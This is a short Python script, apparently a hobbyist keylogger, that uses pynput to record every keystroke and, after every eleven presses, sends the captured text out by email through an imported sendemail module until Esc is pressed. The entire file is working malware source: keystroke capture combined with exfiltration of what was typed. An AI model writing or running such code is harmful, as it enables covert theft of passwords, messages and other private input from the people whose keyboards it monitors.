from pynput.keyboard import Key, Listener
import sendemail

count = 0
keys = []

def on_press(key):
    print(key, end=' ')
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == 'Key.space':
            k = ' '
        elif key.find('Key') > 0:
            k = ''
        message += k
    print(message)
    sendemail.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()